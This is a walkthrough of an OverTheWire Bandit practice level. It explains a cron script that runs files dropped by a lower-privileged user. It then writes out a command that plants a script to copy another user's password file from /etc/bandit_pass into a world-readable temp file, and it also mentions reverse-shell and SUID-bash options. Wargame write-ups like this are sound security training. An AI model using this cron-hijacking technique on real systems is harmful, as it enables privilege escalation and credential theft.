**task**: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

- similar to previous challenges

```shell
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

```

- contents of the shell script

```bash
bandit23@bandit:/var/spool$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

```

tldr: Files belonging to `bandit23` are executed and then deleted.

- It's changing to the `/var/spool/bandit24/foo` dir. _bandit24_ is because the cronjob is being run as that user(hence `whoami` resolves to that user )
- the `for` loop iterates over all the files in the dir and if condition is to not process the `.`(pwd) and `..`(one dir behind)
- stat command here gets the file info but then only the owner name is extracted.
- files belonging to bandit23 and executed and then removed.
  <br>
  <br>

- I can think of things here.
  - run a reverse shell script
  - copy `/bin/bash` to `/tmp/bash` and set the suid bit
  - copy bandit24 password from `/etc/bandit_pass/bandit24`

ima go with the third one.

- create a temporary dir<br>
  `cd $(mktemp -d)`

- next we need to copy `bandit24's` password

```bash
 echo "cp /etc/bandit_pass/bandit24 /tmp/tmp.lu4m07uPES/bandit24 && chmod 777 /tmp/tmp.lu4m07uPES/bandit24" >> /var/spool/bandit24/foo/ban24.sh && chmod +rwx /var/spool/bandit24/foo/ban24.sh
```

- `echo` prints the string to `stdout`
- `cp /etc/bandit_pass/bandit24 /tmp/tmp.lu4m07uPES/bandit24` : copy password to a file named `bandit24` in the temporary dir which you created.
- `chmod 777 /tmp/tmp.lu4m07uPES/bandit24"`: give read, write execute perms to everyone. (`&&` is logical and). (so that `bandit23` can read the file created | actually read perms should be enough)
- `>> /var/spool/bandit24/foo/ban24.sh `: create a new shell script the dir specified in the bash script. (`>>` appends whatever was echoed to stdout to the file specified)
- `chmod +rwx /var/spool/bandit24/foo/ban24.sh` : Give read write exec perms so that bandit24 can execute the shell script. (only exec perms should've been enough).

<br> 
- after a minute or so the bandit24 fiel; will be created in the temp dir with the password.

<br> 
violaaa ! or is it voilaaa !!?
